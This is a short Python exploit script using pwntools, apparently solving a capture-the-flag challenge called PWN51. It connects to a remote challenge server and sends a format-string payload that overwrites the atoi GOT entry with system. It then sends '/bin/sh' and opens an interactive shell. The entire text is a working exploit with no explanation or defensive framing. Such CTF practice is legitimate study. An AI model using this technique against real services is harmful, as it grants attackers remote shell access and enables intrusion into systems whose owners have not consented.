from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10247)
e = ELF('./PWN51')
atoi_got = e.got['atoi']
system_plt = e.plt['system']
payload = fmtstr_payload(10, {atoi_got: system_plt})
io.sendline(payload)
io.sendline(b'/bin/sh\x00')
io.interactive()
